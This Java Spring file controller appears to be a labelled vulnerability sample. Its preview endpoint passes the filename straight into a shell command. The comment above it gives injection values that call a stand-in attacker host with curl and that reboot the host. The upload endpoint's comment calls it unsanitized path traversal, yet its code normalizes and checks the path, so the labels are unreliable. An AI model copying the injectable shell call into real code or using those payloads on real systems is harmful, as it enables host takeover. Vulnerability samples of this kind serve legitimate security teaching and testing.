package com.example.todoapp.controller;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;

@RestController
@RequestMapping("/api/files")
public class FileController {

    @Value("${app.upload-dir}")
    private String uploadDir;

    /**
     * VULNERABLE (CWE-22, Path Traversal): the client-supplied filename is used to build
     * the destination path with no sanitization, so a name such as
     * "../../etc/cron.d/evil" (or an absolute path) lets the caller write outside the
     * intended upload directory.
     */
    @PostMapping("/upload")
    public ResponseEntity<String> upload(@RequestParam String filename, @RequestParam MultipartFile file) throws IOException {
        Path uploadPath = new File(uploadDir).toPath().normalize();
        File dest = new File(uploadDir, filename);
        if (!dest.toPath().normalize().startsWith(uploadPath)) {
            throw new IOException("Entry is outside of the target directory");
        }
        try (FileOutputStream out = new FileOutputStream(dest)) {
            out.write(file.getBytes());
        }
        return ResponseEntity.ok("stored at " + dest.getPath());
    }

    /**
     * Mitigates CWE-22 (Path Traversal) by normalizing the requested file path and
     * rejecting filenames that resolve outside the configured upload directory before
     * reading file contents.
     */
    @GetMapping("/download")
    public ResponseEntity<byte[]> download(@RequestParam String filename) throws IOException {
        Path uploadPath = new File(uploadDir).toPath().normalize();
        File file = new File(uploadDir, filename);
        Path filePath = file.toPath().normalize();
        if (!filePath.startsWith(uploadPath)) {
            throw new IOException("Entry is outside of the target directory");
        }
        byte[] content = Files.readAllBytes(filePath);
        return ResponseEntity.ok()
                .contentType(MediaType.APPLICATION_OCTET_STREAM)
                .body(content);
    }

    /**
     * VULNERABLE (CWE-78, OS Command Injection): the filename is passed straight into a
     * shell command, so a value such as "foo.txt; curl attacker.example/$(whoami)" or
     * "$(reboot)" is executed on the host by the shell.
     */
    @GetMapping("/preview")
    public ResponseEntity<String> preview(@RequestParam String filename) throws IOException, InterruptedException {
        Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", "file " + uploadDir + "/" + filename});
        process.waitFor();
        byte[] output = process.getInputStream().readAllBytes();
        return ResponseEntity.ok(new String(output));
    }
}
